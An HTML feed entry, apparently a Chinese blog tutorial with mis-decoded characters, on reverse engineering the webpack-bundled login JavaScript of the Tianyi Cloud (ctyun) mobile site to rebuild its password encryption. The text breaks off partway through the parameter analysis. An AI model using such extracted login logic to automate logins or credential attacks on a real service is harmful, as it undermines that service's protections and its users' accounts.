        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="é€†å‘ç›®æ ‡"><a href="#é€†å‘ç›®æ ‡" class="headerlink" title="é€†å‘ç›®æ ‡"></a>é€†å‘ç›®æ ‡</h1><ul><li>ç›®æ ‡ï¼šå¤©ç¿¼äº‘ç™»å½•æ¡†</li><li>é“¾æ¥ï¼š<a href="https://m.ctyun.cn/wap/main/auth/login">https://m.ctyun.cn/wap/main/auth/login</a></li><li>ç®€ä»‹ï¼šä¸»è¦å¯¹åŠ å¯†çš„å‡½æ•°çš„æå–ï¼Œæ‰¾æ‰“åŠ å¯†çš„åœ°æ–¹ï¼Œåˆ†æåŠ å¯†å‡½æ•°ï¼Œæå–é‡è¦çš„JSä»£ç è¿›è¡ŒåŠ å¯†ç®—æ³•è¿˜åŸ</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071539849.png" alt="image.png"> </p><ul><li>å‘ç°è¿™å—çš„JSæ˜¯webpackæ‰“åŒ…è¿‡çš„</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071539902.png" alt="image.png"> </p><p>webpackçš„ç‰¹ç‚¹ï¼šå°†æ‰€æœ‰çš„å‡½æ•°å°è£…å¥½ï¼Œé›†æˆåˆ°ä¸€ä¸ªä¸ªæ¨¡å—ä¸­ï¼Œç„¶åä½¿ç”¨åŠ è½½å™¨æˆ–æ–¹æ³•ä½“æ¥è°ƒç”¨è¿™äº›æ¨¡å—ï¼Œå˜æˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ ·å­å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¨¡å—é‡Œé¢çš„å‡½æ•°å’Œå±æ€§ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071541946.png" alt="image-20240507154149907"> </p><h1 id="webpackè®²è§£"><a href="#webpackè®²è§£" class="headerlink" title="webpackè®²è§£"></a>webpackè®²è§£</h1><p><a href="https://blog.csdn.net/sin_0119/article/details/129658679">jsé€†å‘â€”â€”webpackæ‰£æ³•_webpack é€†å‘-CSDNåšå®¢</a></p><h2 id="01-webpackç®€ä»‹"><a href="#01-webpackç®€ä»‹" class="headerlink" title="01 webpackç®€ä»‹"></a>01 webpackç®€ä»‹</h2><p>webpackæ˜¯ä¸ªé™æ€æ¨¡å—æ‰“åŒ…å·¥å…·ï¼Œç›®çš„æ˜¯ä¸ºäº†è®©å‰ç«¯å·¥ç¨‹å¸ˆå†™çš„å‰ç«¯ä»£ç å˜æˆæµè§ˆå™¨å¯ä»¥è¯†åˆ«çš„ä»£ç ï¼Œå¹¶ä¸”å¯ä»¥è¾¾åˆ°å‰ç«¯é¡¹ç›®çš„æ¨¡å—åŒ–ï¼Œä¹Ÿå°±æ˜¯å¦‚ä½•æ›´é«˜æ•ˆåœ°ç®¡ç†å’Œç»´æŠ¤é¡¹ç›®ä¸­çš„æ¯ä¸€ä¸ªèµ„æºã€‚</p><p>ä½†æ— ç–‘æ˜¯å¯¹jsé€†å‘é€ æˆäº†å¦¨ç¢ã€‚ä½†å¦‚æœæŒæ¡äº†æ‰£å–webpackçš„ä¸€äº›æŠ€å·§ä¹Ÿæ˜¯ä¸éš¾çš„ã€‚æ¥ä¸‹æ¥ï¼Œè¯´ä¸€ä¸‹å¯¹æ‰£å–webpackä»£ç çš„ä¸€äº›ç†è§£ã€‚</p><h2 id="02-webpackçš„ç»„æˆ"><a href="#02-webpackçš„ç»„æˆ" class="headerlink" title="02 webpackçš„ç»„æˆ"></a>02 webpackçš„ç»„æˆ</h2><p>ä¸€ä¸ªæœ€åŸºæœ¬çš„webpackç»„æˆæœ‰ä¸¤ä¸ªéƒ¨åˆ†:</p><ul><li>è‡ªæ‰§è¡Œå‡½æ•°</li><li>æ¨¡å—åŠ è½½å™¨(å®é™…ä¸Šä¹Ÿå°±æ˜¯ä¸€ä¸ªå‡½æ•°è€Œå·²)</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071543472.png" alt="img"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line"><span class="keyword">var</span> _xxx;</span><br><span class="line">ï¼<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">xxx</span>(<span class="params">y</span>)&#123;    #è¿™ä¸ªæ˜¯æ¨¡å—åŠ è½½å™¨ï¼Œè¿™ä¸ªyä¼ å…¥çš„å¯ä»¥æ˜¯ç´¢å¼•å’Œå¯¹è±¡çš„keyï¼Œå‚æ•°è¡¨ç¤ºçš„æ˜¯åˆ—è¡¨æˆ–å¯¹è±¡çš„å½¢å‚</span><br><span class="line">        x[y].<span class="title function_">call</span>(å‚æ•°) </span><br><span class="line">    &#125;</span><br><span class="line">    _xxx = xxx;</span><br><span class="line">&#125;( [<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¬¬ä¸€ä¸ª&quot;</span>)&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">consolelog</span>(<span class="string">&quot;ç¬¬äºŒä¸ª&quot;</span>)&#125;,</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¬¬ä¸‰ä¸ª&quot;</span>)&#125;</span><br><span class="line">   ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¯”å¦‚</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="number">0</span>); <span class="comment">//æ‰§è¡Œå¾—åˆ°çš„å°±æ˜¯è¾“å‡ºâ€”â€”ç¬¬ä¸€ä¸ª</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="number">1</span>);<span class="comment">//æ‰§è¡Œå¾—åˆ°çš„å°±æ˜¯è¾“å‡ºâ€”â€”ç¬¬äºŒä¸ª</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.ä¼ å…¥çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> _xxx;</span><br><span class="line">ï¼<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">xxx</span>(<span class="params">y</span>)&#123;    #è¿™ä¸ªæ˜¯æ¨¡å—åŠ è½½å™¨ï¼Œè¿™ä¸ªyä¼ å…¥çš„å¯ä»¥æ˜¯ç´¢å¼•å’Œå¯¹è±¡çš„keyï¼Œå‚æ•°è¡¨ç¤ºçš„æ˜¯åˆ—è¡¨æˆ–å¯¹è±¡çš„å½¢å‚</span><br><span class="line">        x[y].<span class="title function_">call</span>(å‚æ•°) </span><br><span class="line">    &#125;</span><br><span class="line">    _xxx = xxx;</span><br><span class="line">&#125;( &#123;</span><br><span class="line">    <span class="attr">obj1</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¬¬ä¸€ä¸ª&quot;</span>)&#125;,</span><br><span class="line">    <span class="attr">obj2</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="title function_">consolelog</span>(<span class="string">&quot;ç¬¬äºŒä¸ª&quot;</span>)&#125;,</span><br><span class="line">    <span class="attr">obj3</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ç¬¬ä¸‰ä¸ª&quot;</span>)&#125;</span><br><span class="line">   &#125; );</span><br><span class="line"><span class="comment">//å› ä¸ºä¼ å…¥çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£æƒ³è¦è°ƒç”¨å¯¹è±¡å°±è¦æŒ‡æ˜key</span></span><br><span class="line"><span class="title function_">_xxx</span>(<span class="string">&quot;obj1&quot;</span>)</span><br><span class="line"><span class="title function_">_xxx</span>(<span class="string">&quot;obj2&quot;</span>)<span class="comment">//å’Œæ•°ç»„ç›¸æ¯”åªæ˜¯è°ƒç”¨æ–¹å¼ä¸åŒè€Œå·²ï¼ŒåŸç†åŸºæœ¬ä¸€è‡´</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="03-å®æˆ˜çœ‹webpackç»„æˆ"><a href="#03-å®æˆ˜çœ‹webpackç»„æˆ" class="headerlink" title="03 å®æˆ˜çœ‹webpackç»„æˆ"></a>03 å®æˆ˜çœ‹webpackç»„æˆ</h2><p>å…‰è¯´ä¸ç»ƒå‡æŠŠå¼ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä»çœŸå®çš„ç½‘ç«™ä¸­çœ‹ä¸€çœ‹å…³äºwebpackç»„æˆ:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071602810.png" alt="img"> </p><p>é€šè¿‡è§‚å¯ŸçœŸå®ç½‘ç«™çš„webpackå¯ä»¥å‘ç°,è¿™ç§æƒ…å†µä¸æˆ‘ä»¬è‡ªå·±å†™çš„é‚£ä¸ªå¤§å·®ä¸å·®ï¼Œæ— éå°±æ˜¯åŠ è½½å™¨å‡½æ•°ä¸­åŠŸèƒ½æ›´å®Œå–„äº†äº›ã€‚</p><p>è¿™ç§åŠ è½½å™¨å‡½æ•°ä¸æ‰§è¡Œå¯¹è±¡åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­çš„webpackå¾ˆå¥½æ‰£js,è‡³äºå¦‚ä½•æ‰£æˆ‘ä»¬ä»¥åå†è¯´ï¼Œä»Šå¤©è¦è§£å†³çš„æ˜¯ä¸‹é¢çš„è¿™ç§è¦æ€ä¹ˆæ‰£å–ä»£ç å‘¢?</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071603051.png" alt="img"> </p><p>å°±åƒå›¾ä¸­æ‰€å±•ç¤ºçš„é‚£æ ·ï¼Œè¦æ€ä¹ˆæ‰èƒ½æŠŠç›®æ ‡ç»™æ‰£å‡ºæ¥å‘¢?</p><p>é¦–å…ˆï¼Œæƒ³è¦æ‰£å–webpackä»£ç å°±è¦å…ˆæ‰¾åˆ°å…¶åŸºæœ¬è¦ç´ ï¼Œæ³¨æ„:è‡ªæ‰§è¡Œå‡½æ•°ä¸æ˜¯å…³é”®ï¼Œå…³é”®çš„æ˜¯ä¼ å…¥çš„å®å‚ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªå¯¹è±¡(æ•°ç»„)</p><ul><li>ä¼ å…¥çš„å®å‚<ul><li>ä¼ å…¥çš„å®å‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼ŒæŠŠç›®æ ‡å‡½æ•°æ”¾åˆ°è‡ªå·±æ„å»ºçš„å¯¹è±¡é‡Œé¢å°±è¡Œäº†</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ„å»ºè‡ªå·±çš„å¯¹è±¡,æŠŠä¸Šé¢çš„ç›®æ ‡ç»™å¡«åˆ°è¿™ä¸ªé‡Œé¢å°±è¡Œ</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;wk8/&quot;</span>: <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">        <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;g&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;q&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;m&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;I&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;o&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;r&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;v&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n.<span class="title function_">d</span>(t, <span class="string">&quot;n&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = <span class="title function_">n</span>(<span class="string">&quot;zvER&quot;</span>)</span><br><span class="line">          , a = <span class="title function_">n</span>(<span class="string">&quot;MuMZ&quot;</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = &#123;</span><br><span class="line">                <span class="attr">username</span>: e,</span><br><span class="line">                <span class="attr">password</span>: <span class="title class_">Object</span>(a.<span class="property">a</span>)(t),</span><br><span class="line">                <span class="attr">captcha</span>: n</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> o.<span class="property">a</span>.<span class="title function_">formPost</span>(<span class="string">&quot;/user/login&quot;</span>, r)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;test&quot;</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;test success!!&quot;</span>)&#125; <span class="comment">//è¿™ä¸ªä»…ç”¨äºæµ‹è¯•ä½¿ç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><ul><li>å½“ç›®æ ‡å‡½æ•°ä¸­æœ‰ä¾èµ–çš„æ¨¡å—æ—¶ï¼ŒæŠŠä¾èµ–çš„æ¨¡å—ä¹Ÿé€šé€šæ”¾åˆ°è‡ªå·±å†™çš„å¯¹è±¡é‡Œé¢å³å¯</li></ul></li></ul><ul><li>åŠ è½½å™¨å‡½æ•°</li></ul><ul><li><ul><li>å½“çœ‹åˆ°å¦‚ä¸Šå›¾çš„ä»£ç æ—¶å¯èƒ½ä¼šæœ‰äººä¼šä¸æ˜ç™½è¿™å“ªé‡Œæœ‰åŠ è½½å™¨ï¼Œå°±è¿è‡ªæ‰§è¡Œå‡½æ•°éƒ½æ²¡æœ‰</li><li>ä½†å®é™…ä¸Šè‚¯å®šæ˜¯æœ‰åŠ è½½å™¨çš„ï¼Œå¦‚å›¾</li></ul></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071606459.png" alt="img"> </p><ul><li><ul><li>æ‰€ä»¥åœ¨å®šä½åˆ°ç›®æ ‡æ—¶ï¼Œç›®æ ‡çš„å¤§å‡½æ•°ä¸€èˆ¬ä¼šåŠ è½½å…¶ä»–æ¨¡å—ï¼Œè‹¥è¦åŠ è½½å…¶ä»–æ¨¡å—å°±ä¼šä½¿ç”¨åˆ°åŠ è½½å™¨ï¼Œä»¥æ­¤å°±å¯ä»¥æ‰¾åˆ°åŠ è½½å™¨äº†</li></ul></li><li><p>ä½†æ˜¯ï¼Œå½“æ–­åˆ°æˆ‘ä»¬æƒ³è¦çš„[ç›®æ ‡å‡½æ•°]æ—¶å†å»å®šä½n(â€œâ€)å‡½æ•°å“ªé‡Œæ˜¯æ˜¾ç¤ºä¸å‡ºæ¥çš„ï¼Œå¦‚å›¾</p></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071608705.png" alt="image-20240507160832661"> </p><p>è¿™æ˜¯å› ä¸ºåŠ è½½å™¨å‡½æ•°å®é™…ä¸Šæ˜¯åœ¨ä½ æ‰“å¼€ç½‘é¡µçš„æ—¶å€™å°±å·²ç»åŠ è½½åˆ°å†…å­˜ä¸­äº†ï¼Œè€Œåªæœ‰å½“æˆ‘ä»¬è¿›è¡Œç™»å½•è¿™ä¸€å…·ä½“æ“ä½œæ—¶æ‰ä¼šæ‰§è¡Œè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¿™æ—¶æ˜¯æ‰¾ä¸åˆ°åŠ è½½å™¨çš„ã€‚</p><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•: åªéœ€åœ¨åŠ è½½æ¨¡å—çš„å‰é¢åŠ ä¸Šæ–­ç‚¹ï¼Œç„¶ååˆ·æ–°é¡µé¢å°±å¯ä»¥æ‰¾åˆ°åŠ è½½å™¨çš„ä½ç½®äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071609396.png" alt="img"> </p><ul><li>åˆ°æ­¤ï¼Œç›®æ ‡å‡½æ•°ä»¥åŠåŠ è½½å™¨éƒ½å·²ç»æ‰¾é½äº†</li></ul><h2 id="04-webpackè°ƒç”¨åŸç†åˆ†æ"><a href="#04-webpackè°ƒç”¨åŸç†åˆ†æ" class="headerlink" title="04 webpackè°ƒç”¨åŸç†åˆ†æ"></a>04 webpackè°ƒç”¨åŸç†åˆ†æ</h2><p>åœ¨ä¸Šé¢çš„ç¯èŠ‚ä¸­æˆ‘ä»¬ç¡®å®šäº†ç›®æ ‡å‡½æ•°å¹¶æ‰¾åˆ°äº†åŠ è½½å™¨ï¼Œä½†æ­£å¦‚æˆ‘ä»¬çœ‹åˆ°çš„é‚£æ ·ï¼Œå®ƒå¹¶ä¸åƒæˆ‘ä»¬è‡ªå·±å†™çš„é‚£ä¸ªwebpackç›´æ¥æŠŠå¤§å¯¹è±¡ç»™ä¼ è¿›å»äº†ï¼Œè€Œæ˜¯åœ¨å¦ä¸€ä¸ªç‹¬ç«‹çš„æ–‡ä»¶é‡Œé¢ï¼Œé‚£ä¹ˆåŠ è½½å™¨åˆæ˜¯å¦‚ä½•å¯¹å¦ä¸€ä»½ç‹¬ç«‹çš„æ–‡ä»¶ä¸­çš„æ¨¡å—è¿›è¡ŒåŠ è½½çš„å‘¢?</p><p>é¦–å…ˆæ¥çœ‹æˆ‘ä»¬æ‰¾çš„çš„é‚£ä¸ªåŠ è½½å™¨,å¦‚å›¾ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071615605.png" alt="img"> </p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦è§£å†³çš„æ˜¯è‡ªæ‰§è¡Œå‡½æ•°çš„å½¢å‚cæ˜¯å¦‚ä½•å˜æˆç‹¬ç«‹æ–‡ä»¶ä¸­çš„é‚£ä¸ªå­˜æœ‰æ¨¡å—çš„å¯¹è±¡çš„:</p><ol><li>æˆ‘ä»¬æŠŠå¾—åˆ°çš„è‡ªæ‰§è¡Œå‡½æ•°æ‹¿å‡ºæ¥æ”¾åˆ°node.jsç¯å¢ƒä¸­æ‰§è¡Œä¸€ä¸‹</li></ol><ul><li><ul><li>å…¶ä¸­å°†ä¼ å…¥çš„ç©ºæ•°ç»„å˜æˆä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡é‡Œé¢æ”¾æœ‰ä¸€ä¸ªæµ‹è¯•å‡½æ•°</li><li>è¾“å‡ºè‡ªæ‰§è¡Œå‡½æ•°çš„å½¢å‚</li><li>å¹¶å°†åŠ è½½å™¨å‡½æ•°ç»™å¯¼å‡ºæ¥</li></ul></li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071619382.png" alt="img"> </p><ol start="2"><li>æˆ‘ä»¬å°†ç›®æ ‡å‡½æ•°æ‰€åœ¨çš„é‚£ä¸ªç‹¬ç«‹æ–‡ä»¶å…¨éƒ¨å†™å…¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å½“ä¸­å»</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620373.png" alt="img"> </p><ol start="3"><li>åœ¨è‡ªæ‰§è¡Œå‡½æ•°çš„ä¸Šé¢å¯¹åˆšåˆšå†™å…¥çš„æ–‡ä»¶è¿›è¡Œå¼•å…¥ï¼Œå†æ¬¡æ‰§è¡Œå‡½æ•°</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620775.png" alt="img"> </p><ol start="4"><li>é€šè¿‡å®éªŒï¼Œæˆ‘ä»¬çŸ¥é“äº†é€šè¿‡å¼•å…¥å¤–éƒ¨æ–‡ä»¶å¯ä»¥å°†æ¨¡å—åŠ è½½åˆ°å½¢å‚é‡Œé¢ï¼Œé‚£ä¹ˆæ˜¯å¦‚ä½•å®ç°çš„å‘¢? é€šè¿‡è°ƒè¯•è‡ªæ‰§è¡Œä»£ç å¯ä»¥æ˜ç™½</li></ol><ul><li>åœ¨ä¸å•ä¸ªæ–‡ä»¶æœ‰ç›¸åŒéƒ¨åˆ†ä¸‹é¢å¯ç–‘éƒ¨åˆ†æ‰“ä¸Šå‡ ä¸ªæ–­ç‚¹å¦‚ä¸‹:</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620297.png" alt="img"> </p><ul><li>æ¥ç€å‘ä¸‹è¿›è¡Œï¼Œé€šè¿‡è¯»ä»£ç å¯ä»¥çŸ¥é“é€šè¿‡forå¾ªç¯æ‰§è¡Œäº†å‡½æ•°n(),é€šè¿‡ä¸‹å›¾å¯ä»¥çŸ¥é“æ˜¯ä¸ºäº†åŠ è½½å¤–éƒ¨æ¨¡å—</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071620315.png" alt="img"> </p><ul><li>å†å‘ä¸‹è¿›è¡Œåˆ°ç¬¬ä¸‰ä¸ªæ–­ç‚¹</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071621596.png" alt="img"> </p><p>è‡³äºé‚£ä¸ªforå¾ªç¯æ˜¯æ€ä¹ˆå°†å¤–éƒ¨æ¨¡å—è¿›è¡Œå¼•å…¥çš„æˆ‘ä»¬å¹¶ä¸éœ€è¦æ·±ç©¶ï¼Œåªéœ€è¦çŸ¥é“å½“æ‰£ä»£ç æ—¶ä¸€å®šä¸èƒ½å°†è¿™ä¸ªforå¾ªç¯ç»™å¿˜æ‰ï¼Œå¦‚æœå¿˜æ‰çš„è¯å¤–éƒ¨æ–‡ä»¶æ˜¯æ— æ³•åŠ è½½è¿›æ¥çš„ã€‚</p><h1 id="é€†å‘å‚æ•°"><a href="#é€†å‘å‚æ•°" class="headerlink" title="é€†å‘å‚æ•°"></a>é€†å‘å‚æ•°</h1><h2 id="1-å®šä½åˆ°passwordåŠ å¯†å‡½æ•°"><a href="#1-å®šä½åˆ°passwordåŠ å¯†å‡½æ•°" class="headerlink" title="1. å®šä½åˆ°passwordåŠ å¯†å‡½æ•°"></a>1. å®šä½åˆ°passwordåŠ å¯†å‡½æ•°</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071624397.png" alt="img"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">encodeURI(Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value))))</span><br></pre></td></tr></table></figure><p>æ‹†åˆ†ä¸€ä¸‹åå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r.value</span><br><span class="line">Object(w[&quot;g&quot;])(r.value)</span><br><span class="line">Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value)</span><br><span class="line"></span><br><span class="line">a.value</span><br><span class="line"></span><br><span class="line">Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value)))</span><br><span class="line"></span><br><span class="line">encodeURI(Object(w[&quot;c&quot;])(a.value, Object(w[&quot;f&quot;])(Object(w[&quot;g&quot;])(r.value))))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071624714.png" alt="img"> </p><h2 id="2-ç¬¬ä¸€ä¸ªå‚æ•°åˆ†æ"><a href="#2-ç¬¬ä¸€ä¸ªå‚æ•°åˆ†æ" class="headerlink" title="2. ç¬¬ä¸€ä¸ªå‚æ•°åˆ†æ"></a>2. ç¬¬ä¸€ä¸ªå‚æ•°åˆ†æ</h2><p>a.valueï¼šç›´æ¥å°±æ˜¯è¾“å…¥çš„å¯†ç æ˜æ–‡</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071625245.png" alt="img"> </p><h2 id="3-ç¬¬äºŒä¸ªå‚æ•°åˆ†æ"><a href="#3-ç¬¬äºŒä¸ªå‚æ•°åˆ†æ" class="headerlink" title="3. ç¬¬äºŒä¸ªå‚æ•°åˆ†æ"></a>3. ç¬¬äºŒä¸ªå‚æ•°åˆ†æ</h2><p>Object(w[â€œfâ€])(Object(w[â€œgâ€])(r.value)</p><h3 id="ï¼ˆ1ï¼‰w-â€œgâ€"><a href="#ï¼ˆ1ï¼‰w-â€œgâ€" class="headerlink" title="ï¼ˆ1ï¼‰w[â€œgâ€]"></a>ï¼ˆ1ï¼‰w[â€œgâ€]</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯jsçš„[å­—ç¬¦ä¸²æ›¿æ¢]å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°å¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–æ­£åˆ™è¡¨è¾¾å¼ï¼ˆç”¨ä»¥è¿›è¡ŒåŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼‰ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯å­—ç¬¦ä¸²ï¼ˆæ›¿æ¢åŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼‰ã€‚å°±æ˜¯åœ¨åŸå­—ç¬¦ä¸²ä¸ŠæŠŠå’Œç¬¬ä¸€ä¸ªå‚æ•°ç›¸åŒçš„å­—ç¬¦ä¸²æ›¿æ¢æˆç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071626148.png" alt="img"> </p><p>è¿™ä¸ªä¾‹å­ä½¿ç”¨çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²ï¼Œå…¶ä¸­â€&#x2F; &#x2F;â€œè¿™ä¸ªæ˜¯å›ºå®šå†™æ³•ï¼Œâ€\sâ€æ˜¯è½¬ç§»ç¬¦å·ç”¨ä»¥åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ï¼Œâ€œgâ€è¡¨ç¤ºå…¨å±€åŒ¹é…å°†æ›¿æ¢æ‰€æœ‰åŒ¹é…çš„å­ä¸²ï¼Œå¦‚æœä¸åŠ â€gâ€å½“åŒ¹é…åˆ°ç¬¬ä¸€ä¸ªåå°±ç»“æŸäº†ã€‚</p><p>è¿™ä¸ªä¾‹å­çš„æ„æ€å°±æ˜¯å°†åŸå­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰ç©ºç™½å­—ç¬¦æ›¿æ¢æˆâ€â€ï¼Œæ¯”å¦‚â€abc d efg â€œå­—æ ·çš„å­—ç¬¦ä¸²ä½¿ç”¨è¿™ä¸ªå‡½æ•°åå°†å˜æˆâ€abcdefgâ€ã€‚</p><h3 id="ï¼ˆ2ï¼‰w-â€œfâ€"><a href="#ï¼ˆ2ï¼‰w-â€œfâ€" class="headerlink" title="ï¼ˆ2ï¼‰w[â€œfâ€]"></a>ï¼ˆ2ï¼‰w[â€œfâ€]</h3><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯ç”¨æˆ·åå¡«å……ã€‚</p><p>å½“è¾“å‡ºçš„ç”¨æˆ·åä¸è¶³24ä½çš„æ—¶å€™ï¼Œåœ¨åé¢è¡¥å…… â€œ0â€ã€‚æ¯”å¦‚è¾“å…¥ç”¨æˆ·åä¸º â€œ<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#49;&#50;&#x33;&#46;&#99;&#111;&#109;">&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#49;&#50;&#x33;&#46;&#99;&#111;&#109;</a>â€œï¼Œåˆ™å¡«å……åä¸º â€œ<a href="mailto:&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#x31;&#x32;&#x33;&#46;&#99;&#111;&#x6d;&#x30;&#48;&#48;&#x30;&#x30;&#48;&#x30;&#x30;&#x30;&#x30;&#x30;">&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#x31;&#x32;&#x33;&#46;&#99;&#111;&#x6d;&#x30;&#48;&#48;&#x30;&#x30;&#48;&#x30;&#x30;&#x30;&#x30;&#x30;</a>â€œ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071629181.png" 